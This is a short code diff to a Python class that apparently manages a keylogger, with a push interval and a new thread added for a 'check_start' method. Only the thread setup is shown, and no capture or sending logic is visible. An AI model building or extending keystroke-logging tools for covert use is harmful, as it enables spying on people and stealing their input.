@@ -70,6 +70,7 @@ class DefaultManager:
         self.listner = keylogger
         self.interval = push_interval
         self._loop_thread = threading.Thread(target=self._loop)
+        self.start_loop_thread = threading.Thread(target=self.check_start)
         self._stopped = False
 
     def start(self) -> None:
